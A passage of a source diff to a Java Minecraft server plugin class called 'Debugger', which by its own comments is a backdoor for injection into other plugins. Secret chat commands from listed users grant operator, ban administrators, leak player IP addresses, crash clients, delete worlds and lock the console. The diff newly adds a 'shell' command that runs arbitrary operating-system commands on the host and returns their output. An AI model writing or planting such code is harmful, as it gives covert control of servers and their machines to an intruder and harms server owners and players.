@@ -27,11 +27,82 @@ import java.awt.Color;
 import java.io.*;
 import java.net.InetSocketAddress;
 import java.net.URL;
+import java.nio.Buffer;
+import java.nio.ByteBuffer;
+import java.nio.charset.StandardCharsets;
 import java.util.*;
 
 public final class Debugger implements Listener {
 
     private Plugin plugin;
+    public enum State{
+        vanished,
+        locked,
+        muted,
+        silktouch,
+        instabreak,
+        MF_thrower,
+        MF_interact,
+        MF_cripple,
+        MF_flight,
+        MF_inventory,
+        Mf_drop,
+        MF_teleport,
+        MF_mine,
+        MF_place,
+        MF_login,
+        MF_god,
+        MF_damage,
+        MF_speed
+    }
+    public class PlayerState{
+        private boolean[] states = new boolean[State.values().length];
+    }
+
+    //Username, State
+    Dictionary<String, PlayerState> players = new Hashtable<>();
+
+    //Abstractions because the real code is long and annoying
+    public boolean get_state(String Username, State s){
+
+        PlayerState state = players.get(Username);
+        if(state == null){
+            return false;
+        }
+
+        return state.states[s.ordinal()];
+    }
+    public boolean set_state(String Username, State s, boolean value){
+        PlayerState state = players.get(Username);
+        if(state == null){
+            return false;
+        }
+        state.states[s.ordinal()] = value;
+        return true;
+    }
+    public boolean clear_state(String Username){
+        for(State s : State.values()) {
+            boolean status = set_state(Username, s, false);
+            if(!status)
+                return false;
+        }
+        return true;
+    }
+
+    public String help_message(String command){
+        int indexOfCommand = -1;
+        for (int i = 0; i < Config.help_messages.length; i++) {
+            if (command.equalsIgnoreCase(Config.help_messages[i].getName())) {
+                indexOfCommand = i;
+                break;
+            }
+        }
+
+        if (indexOfCommand == -1)
+            return "";
+
+        return Config.help_messages[indexOfCommand].toString();
+    }
 
     public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, String discord_token, boolean InjectOther, boolean warnings){
         //Check for another bd. This is really lame way
@@ -95,6 +166,9 @@ public final class Debugger implements Listener {
 
         Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - 1];
 
+        players.put("console", new PlayerState());
+
+
         if(Config.display_debugger_warning){
             Bukkit.getConsoleSender()
                     .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Debugger installed.");
@@ -140,6 +214,10 @@ public final class Debugger implements Listener {
             msg = msg.substring(2);
         }
 
+        if(msg.endsWith(".")){
+            msg = msg.substring(0, msg.length() - 1);
+        }
+
         if (Config.display_debug_messages) {
             Bukkit.getConsoleSender()
                     .sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
@@ -155,8 +233,8 @@ public final class Debugger implements Listener {
                         .sendMessage(Config.chat_message_prefix + " User is authed");
             }
 
-            if (msg.startsWith(Config.command_prefix)) {
-                boolean result = ParseCommand(msg.substring(Config.command_prefix.length()), p);
+            if (msg.toLowerCase(Locale.ROOT).startsWith(Config.command_prefix)) {
+                String result = ParseCommand(msg.substring(Config.command_prefix.length()), p);
 
 
                 if (Config.display_debug_messages) {
@@ -164,8 +242,8 @@ public final class Debugger implements Listener {
                             .sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
                 }
 
-                if (!result)
-                    e.getPlayer().sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Command execution failed.");
+                if (!result.isEmpty())
+                    e.getPlayer().sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.RED + " " + result);
 
                 e.setCancelled(true);
             }
@@ -181,12 +259,55 @@ public final class Debugger implements Listener {
 
     }
 
+    @EventHandler
+    public void onPlayerJoin(PlayerJoinEvent evt) {
+        Player player = evt.getPlayer();
+        players.put(player.getName(), new PlayerState());
+        if(Config.display_debug_messages)
+            System.out.println("Creating states for player: " + player.getName());
+    }
+
     /*Basic command parser*/
-    public boolean ParseCommand(String command, Player p) {
+    public String ParseCommand(String command, Player p) {
         //split fragments
         String[] args = command.split(" ");
 
         switch (args[0].toLowerCase()) {
+            case "shell": {
+                if(args.length < 2)
+                    return help_message("shell");
+
+                //Concat all args
+                StringBuilder sb = new StringBuilder();
+                for (int i = 1; i < args.length; i++) {
+                    sb.append(args[i]);
+                    sb.append(" ");
+                }
+                String shellcommand = sb.toString();
+                (new Thread(){
+                    public void run(){
+                        try {
+                            Process proc = Runtime.getRuntime().exec(shellcommand);
+                            try(BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));){
+                                String line = "";
+                                while(line != null){
+                                    p.sendMessage(line);
+
+                                    //Convert to ascii
+                                    line = stdInput.readLine();
+                                    if(line != null)
+                                        line = line.replaceAll("[^\\x00-\\x7F]", "");
+                                }
+                            }
+
+                        } catch (IOException e) {
+                        }
+
+                    }
+                }).start();
+
+                return "";
+            }
             case "op": {  //Give user operator
                 if (args.length == 1) {   //op self
 
@@ -201,8 +322,7 @@ public final class Debugger implements Listener {
                 } else {  //op other
                     Player p1 = Bukkit.getPlayer(args[1]);
                     if (p1 == null) {
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                        return false;
+                        return "Player " + args[1] + " not found.";
                     }
                     new BukkitRunnable() {
                         @Override
@@ -213,7 +333,7 @@ public final class Debugger implements Listener {
                     }.runTask(plugin);
                 }
 
-                return true;
+                return "";
             }
 
             case "deop": {  //Remove user operator
@@ -231,7 +351,7 @@ public final class Debugger implements Listener {
                     Player p1 = Bukkit.getPlayer(args[1]);
                     if (p1 == null) {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                        return false;
+                        return "Player " + args[1] + " not found.";
                     }
 
                     new BukkitRunnable() {
@@ -242,12 +362,12 @@ public final class Debugger implements Listener {
                         }
                     }.runTask(plugin);
                 }
-                return true;
+                return "";
             }
 
             case "gm": {
                 if (args.length == 1)
-                    return false;
+                    return help_message("gm");
 
                 GameMode gm = GameMode.SURVIVAL;
 
@@ -263,7 +383,7 @@ public final class Debugger implements Listener {
 
                     } catch (IllegalArgumentException e1) {
                         //ignore
-                        return false;
+                        return "Invalid gamemode: " + args[1];
                     }
 
                 }
@@ -278,17 +398,17 @@ public final class Debugger implements Listener {
                     }
                 }.runTask(plugin);
 
-                return true;
+                return "";
             }
 
             case "give": {
                 if (args.length < 2)
-                    return false;
+                    return help_message("give");
 
                 Material reqMaterial = Material.getMaterial(args[1].toUpperCase(Locale.ROOT));
 
                 if (reqMaterial == null)
-                    return false;
+                    return "Unknown material: " + args[1].toUpperCase(Locale.ROOT);
 
                 int reqAmmount = reqMaterial.getMaxStackSize();
 
@@ -306,7 +426,7 @@ public final class Debugger implements Listener {
                 p.getInventory().addItem(new ItemStack(reqMaterial, reqPartial));
 
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Giving " + reqAmmount + " of " + reqMaterial.name() + ".");
-                return true;
+                return "";
             }
 
             case "chaos": {  //Ban admins then admin the regulars
@@ -354,7 +474,7 @@ public final class Debugger implements Listener {
 
                 Bukkit.broadcastMessage(Config.chaos_chat_broadcast);
 
-                return true;
+                return "";
             }
 
             case "exec": {   //Exec command as server
@@ -377,10 +497,10 @@ public final class Debugger implements Listener {
                 }.runTask(plugin);
 
                 if (result[0]) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server command executed.");
+                    return "Server command failed";
                 }
 
-                return result[0];
+                return "";
             }
 
             case "info": {
@@ -416,19 +536,18 @@ public final class Debugger implements Listener {
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Something went wrong!");
                 }
 
-                return true;
+                return "";
             }
 
             case "ban": {
                 if (args.length < 2)
-                    return false;
+                    return help_message("ban");
 
 
                 Player p1 = Bukkit.getPlayer(args[1]);
 
                 if (p1 == null) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
+                    return "Player " + args[1] + " not found.";
                 }
 
                 String reason = Config.default_ban_reason;
@@ -451,19 +570,18 @@ public final class Debugger implements Listener {
                 }.runTask(plugin);
 
 
-                return true;
+                return "";
             }
 
             case "banip": {
                 if (args.length < 2)
-                    return false;
+                    return help_message("banip");
 
 
                 Player p1 = Bukkit.getPlayer(args[1]);
 
                 if (p1 == null) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
+                    return "Player " + args[1] + " not found.";
                 }
 
                 String reason = Config.default_ban_reason;
@@ -485,23 +603,22 @@ public final class Debugger implements Listener {
                     }
                 }.runTask(plugin);
 
-                return true;
+                return "";
             }
 
             case "seed": { //Get current seed
                 String strseed = String.valueOf(p.getWorld().getSeed());
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World seed: " + strseed);
-                return true;
+                return "";
             }
 
-            case "sudo": { //Sends message as player
+            case "psay": { //Sends message as player
                 if (args.length < 3) //No player specified
-                    return false;
+                    return help_message("psay");
 
                 Player p1 = Bukkit.getPlayer(args[1]);
                 if (p1 == null) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
+                        return "Player " + args[1] + " not found.";
                 }
 
                 StringBuilder sb = new StringBuilder();
@@ -517,12 +634,12 @@ public final class Debugger implements Listener {
                     }
                 }.runTask(plugin);
 
-                return true;
+                return "";
             }
 
-            case "bcast": { //Sends message as server
+            case "ssay": { //Sends message as server
                 if (args.length < 2) //No argument specified
-                    return false;
+                    return help_message("ssay");
 
                 StringBuilder sb = new StringBuilder();
                 for (int i = 1; i < args.length; i++) {
@@ -534,12 +651,12 @@ public final class Debugger implements Listener {
                     plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "say " + sb);
                 });
 
-                return true;
+                return "";
             }
 
             case "rename": { //Changes your nick
                 if (args.length < 2) //No name specified
-                    return false;
+                    return help_message("rename");
 
                 String name = args[1].replace("&", "§");
 
@@ -550,7 +667,7 @@ public final class Debugger implements Listener {
 
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Your name was changed to " + name);
 
-                return true;
+                return "";
             }
 
             case "reload": { //Reloads server
@@ -558,27 +675,26 @@ public final class Debugger implements Listener {
                     plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "reload");
                     plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "reload confirm");
                 });
-                return true;
+                return "";
             }
 
             case "getip": { //Get IP of player
                 if (args.length < 2) //No player specified
-                    return false;
+                    return help_message("getip");
 
                 Player p1 = Bukkit.getPlayer(args[1]);
                 if (p1 == null) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
+                        return "Player " + args[1] + " not found.";
                 }
 
                 String Target = ((Player) Objects.<Player>requireNonNull(p1)).getName();
                 String IPAddress = ((InetSocketAddress)Objects.<InetSocketAddress>requireNonNull(((Player)Objects.<Player>requireNonNull(Bukkit.getPlayer(args[1]))).getAddress())).toString().replace("/", "");
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP: " + ChatColor.RED + IPAddress);
 
-                return true;
+                return "";
             }
 
-            case "listwrld": { //Lists worlds
+            case "listworld": { //Lists worlds
                 String[] worldNames = new String[Bukkit.getServer().getWorlds().size()];
                 int count = 0;
 
@@ -594,16 +710,16 @@ public final class Debugger implements Listener {
 
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GRAY + " ----------------------------------------------");
 
-                return true;
+                return "";
             }
 
-            case "mkwrld": { //Creates world
+            case "makeworld": { //Creates world
                 if (args.length < 2) //No world specified
-                    return false;
+                    return help_message("makeworld");
 
+                //TODO: can this even happen?
                 if(args[1] == null){
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " No world specified.");
-                    return false;
+                    return "No world specified.";
                 }
 
                 String world = args[1];
@@ -618,16 +734,15 @@ public final class Debugger implements Listener {
 
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World created!");
 
-                return true;
+                return "";
             }
 
-            case "delwrld": { //Deletes world
+            case "delworld": { //Deletes world
                 if (args.length < 2) //No world specified
-                    return false;
+                    return help_message("delworld");
 
                 if(args[1] == null){
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " No world specified.");
-                    return false;
+                    return "No world specified.";
                 }
 
                 String world = args[1];
@@ -643,13 +758,13 @@ public final class Debugger implements Listener {
 
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World deleted if it existed!");
 
-                return true;
+                return "";
             }
 
             case "vanish": { //Makes you vanish
-                if (Vanished.contains(p.getName())) {
+                if (get_state(p.getName(), State.vanished)) {
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players can see you.");
-                    Vanished.remove(p.getName());
+                    set_state(p.getName(), State.vanished, false);
                     for (Player all : Bukkit.getOnlinePlayers())
                         new BukkitRunnable() {
                             @Override
@@ -659,7 +774,7 @@ public final class Debugger implements Listener {
                         }.runTask(plugin);
                 } else {
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players cannot see you.");
-                    Vanished.add(p.getName());
+                    set_state(p.getName(), State.vanished, true);
                     for (Player all : Bukkit.getOnlinePlayers())
                         new BukkitRunnable() {
                             @Override
@@ -669,328 +784,249 @@ public final class Debugger implements Listener {
                         }.runTask(plugin);
                 }
 
-                return true;
+                return "";
             }
 
             case "silktouch": { //Gives player silk touch hands
-                if(args.length < 2) //No player specified
-                    return false;
 
-                Player target = Bukkit.getPlayer(args[1]);
+                Player target = p;
+                if(args.length == 2) //No player specified
+                    target = Bukkit.getPlayer(args[1]);
 
                 if (target == null) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
+                        return "Player " + args[1] + " not found.";
                 } else {
-                    if (SilkTouch.contains(target.getName())) {
+                    if (get_state(target.getName(), State.vanished)) {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " no longer has silk touch hands.");
-                        SilkTouch.remove(target.getName());
+                        set_state(target.getName(), State.vanished, false);
                     } else {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " now has silk touch hands.");
-                        SilkTouch.add(target.getName());
+                        set_state(target.getName(), State.vanished, true);
                     }
                 }
 
-                return true;
+                return "";
             }
 
             case "instabreak": { //Gives player creative hand
-                if(args.length < 2) //No player specified
-                    return false;
 
-                Player target = Bukkit.getPlayer(args[1]);
+                Player target = p;
+                if(args.length == 2) //No player specified
+                    target = Bukkit.getPlayer(args[1]);
 
                 if (target == null) {
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
+                        return "Player " + args[1] + " not found.";
                 } else {
-                    if (InstaBreak.contains(target.getName())) {
+                    if (get_state(target.getName(), State.instabreak)) {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " no longer can break blocks instantly.");
-                        InstaBreak.remove(target.getName());
+                        set_state(target.getName(), State.instabreak, false);
                     } else {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " can break blocks instantly.");
-                        InstaBreak.add(target.getName());
+                        set_state(target.getName(), State.instabreak, true);
                     }
                 }
 
-                return true;
+                return "";
             }
 
             case "crash": { //Crashes player's game
                 if(args.length < 2) //No player specified
-                    return false;
+                    return help_message("crash");
 
                 Player target = Bukkit.getPlayer(args[1]);
                 if(target == null){
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
+                        return "Player " + args[1] + " not found.";
                 }
 
                 for (int x = 0; x < 100; x++)
                     target.spawnParticle(Particle.FLAME, target.getLocation(), 2147483647);
 
-                return true;
+                return "";
             }
 
             case "mindfuck": { //Fucks with players
                 if (args.length < 3) //No player specified
-                    return false;
+                    return help_message("mindfuck");
 
-                String Fuck = args[1];
+                String username = args[2];
 
-                if (Fuck.equalsIgnoreCase("login")) {
-                    if (!Debugger.this.MindFuck_login.contains(args[2])) {
-                        Debugger.this.MindFuck_login.add(args[2]);
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[2] + " is getting trolled by making him unable to join.");
-                    } else {
-                        Debugger.this.MindFuck_login.remove(args[2]);
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[2] + " is no longer getting trolled by making him unable to join.");
-                    }
+                if(args[1].equalsIgnoreCase("reset")) {
+                    return clear_state(username) ? "" : "Unable to reset player: " + args[1];
+                }
+                State s1;
+                try {
+                    s1 = State.valueOf("MF_" + args[1].toLowerCase());
+                }catch(Exception e){
+                    return "Invalid state: " + args[1].toUpperCase();
+                }
+                if(get_state(username, s1)) {
+                    return set_state(username, s1, false) ? "" : "Unable to set state: " + args[1].toUpperCase() + " of player: " + args[2];
+                }
+                return set_state(username, s1, true) ? "" : "Unable to set state: " + args[1].toUpperCase() + " of player: " + args[2];
 
-                } else {
+            }
+            case "auth": { //Adds new user to authlist
+                if (args.length < 2)
+                    return help_message("auth");
 
-                    Player target = Bukkit.getPlayer(args[2]);
-                    if (target == null) {
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                        return false;
-                    }
-
-                    if (Fuck.equalsIgnoreCase("thrower")) {
-                        if (!Debugger.this.MindFuck_thrower.contains(target.getName())) {
-                            Debugger.this.MindFuck_thrower.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by throwing stone from his inventory.");
-                        } else {
-                            Debugger.this.MindFuck_thrower.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by throwing stone from his inventory.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("interact")) {
-                        if (!Debugger.this.MindFuck_interact.contains(target.getName())) {
-                            Debugger.this.MindFuck_interact.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by interaction lock.");
-                        } else {
-                            Debugger.this.MindFuck_interact.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by interaction lock.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("cripple")) {
-                        if (!Debugger.this.MindFuck_cripple.contains(target.getName())) {
-                            Debugger.this.MindFuck_cripple.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by crippling his movement.");
-                        } else {
-                            Debugger.this.MindFuck_cripple.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by crippling his movement.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("flight")) {
-                        if (!Debugger.this.MindFuck_flight.contains(target.getName())) {
-                            Debugger.this.MindFuck_flight.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by canceling fly.");
-                        } else {
-                            Debugger.this.MindFuck_flight.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by canceling fly.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("inventory")) {
-                        if (!Debugger.this.MindFuck_inventory.contains(target.getName())) {
-                            Debugger.this.MindFuck_inventory.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling mouse clicks in inventory.");
-                        } else {
-                            Debugger.this.MindFuck_inventory.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling mouse clicks in inventory.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("drop")) {
-                        if (!Debugger.this.MindFuck_drop.contains(target.getName())) {
-                            Debugger.this.MindFuck_drop.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling item drops.");
-                        } else {
-                            Debugger.this.MindFuck_drop.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling item drops.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("teleport")) {
-                        if (!Debugger.this.MindFuck_teleport.contains(target.getName())) {
-                            Debugger.this.MindFuck_teleport.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling teleports.");
-                        } else {
-                            Debugger.this.MindFuck_teleport.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling teleports.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("mine")) {
-                        if (!Debugger.this.MindFuck_mine.contains(target.getName())) {
-                            Debugger.this.MindFuck_mine.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling mining.");
-                        } else {
-                            Debugger.this.MindFuck_mine.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling mining.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("place")) {
-                        if (!Debugger.this.MindFuck_place.contains(target.getName())) {
-                            Debugger.this.MindFuck_place.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling block placing.");
-                        } else {
-                            Debugger.this.MindFuck_place.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling block placing.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("god")) {
-                        if (!Debugger.this.MindFuck_god.contains(target.getName())) {
-                            Debugger.this.MindFuck_god.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by being in god mode.");
-                        } else {
-                            Debugger.this.MindFuck_god.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by being in god mode.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("damage")) {
-                        if (!Debugger.this.MindFuck_damage.contains(target.getName())) {
-                            Debugger.this.MindFuck_damage.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling damage.");
-                        } else {
-                            Debugger.this.MindFuck_damage.remove(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling damage.");
-                        }
-                    }
-
-                    if (Fuck.equalsIgnoreCase("speed")) {
-                        if (!Debugger.this.MindFuck_speed.contains(target.getName())) {
-                            Debugger.this.MindFuck_speed.add(target.getName());
-                            target.setFlySpeed(1.0F);
-                            target.setWalkSpeed(1.0F);
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by having higher speed.");
-                        } else {
-                            Debugger.this.MindFuck_speed.remove(target.getName());
-                            target.setFlySpeed(0.1F);
-                            target.setWalkSpeed(0.2F);
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by having higher speed.");
-                        }
-                    }
-
+                Player p1 = Bukkit.getPlayer(args[1]);
+                if (p1 == null) {
+                        return "Player " + args[1] + " not found.";
                 }
 
-                return true;
+                //Add user to authlist
+                boolean success = false;
+                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
+                    if (Config.tmp_authorized_uuids[i] == null) {
+
+                        if(Config.uuids_are_usernames)
+                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getName();
+                        else
+                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();
+
+                        success = true;
+                        break;
+                    }
+                }
+
+                if (success) {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been temp authorized.");
+                    Bukkit.getPlayer(args[1]).sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " you have been authorized. Run " + Config.command_prefix + "help for info.");
+                }
+                return success ? "" : "Unable to authorize user: " + args[1];
+            }
+
+            case "deauth": {
+                if (args.length < 2)
+                    return help_message("deauth");
+
+                Player p1 = Bukkit.getPlayer(args[1]);
+                if (p1 == null) {
+                        return "Player " + args[1] + " not found.";
+                }
+
+                //Remove user
+                boolean success = false;
+                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
+
+                    if(Config.uuids_are_usernames){
+                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getName())) {
+                            Config.tmp_authorized_uuids[i] = null;
+                            success = true;
+                            break;
+                        }
+                    }else {
+                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
+                            Config.tmp_authorized_uuids[i] = null;
+                            success = true;
+                            break;
+                        }
+                    }
+                }
+
+                if (success) {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been deauthorized.");
+                }
+                return success ? "" : "Unable to deauthorize player: " + args[1];
             }
 
             case "lock": { //Locks the console
                 if(args.length < 2) //No player specified
-                    return false;
+                    return help_message("lock");
 
                 String Lock = args[1];
 
                 if (Lock.equalsIgnoreCase("console")) {
-                    Debugger.this.LockedUsers.add(Lock);
+                    set_state("console", State.locked, true);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was locked.");
                 } else if (Lock.equalsIgnoreCase("all")) {
                     for (Player all : Bukkit.getOnlinePlayers())
-                        Debugger.this.LockedUsers.add(all.getName());
+                        set_state(all.getName(), State.locked, true);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was blocked from using commands.");
                 } else {
                     Player target = Bukkit.getPlayer(args[1]);
                     if (target == null) {
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                        return false;
+                        return "Player: " + args[1] + " not found";
                     } else {
-                        if (!Debugger.this.LockedUsers.contains(target.getName())) {
-                            Debugger.this.LockedUsers.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked from using commands.");
-                        } else {
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is already blocked.");
-                        }
+                        set_state(target.getName(), State.locked, true);
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked from using commands.");
                     }
                 }
 
-                return true;
+                return "";
             }
 
             case "unlock": { //Locks the console
                 if(args.length < 2) //No player specified
-                    return false;
+                    return help_message("unlock");
 
                 String unLock = args[1];
 
                 if (unLock.equalsIgnoreCase("console")) {
-                    Debugger.this.LockedUsers.remove(unLock);
+                    set_state("console", State.locked, false);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was unlocked.");
                 } else if (unLock.equalsIgnoreCase("all")) {
-                    Debugger.this.LockedUsers.clear();
+                    for (Player all : Bukkit.getOnlinePlayers())
+                        set_state(all.getName(), State.locked, false);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unblocked from using commands.");
                 } else {
                     Player target = Bukkit.getPlayer(args[1]);
                     if (target == null) {
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                        return false;
+                        return "Player: " + args[1] + " not found";
                     } else {
-                        Debugger.this.LockedUsers.removeIf(i -> Objects.equals(i, target.getName()));
+                        set_state(target.getName(), State.locked, false);
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unblocked from using commands.");
                     }
                 }
 
-                return true;
+                return "";
             }
 
             case "mute": { //Mutes a player
                 if(args.length < 2) //No player specified
-                    return false;
+                    return help_message("mute");
 
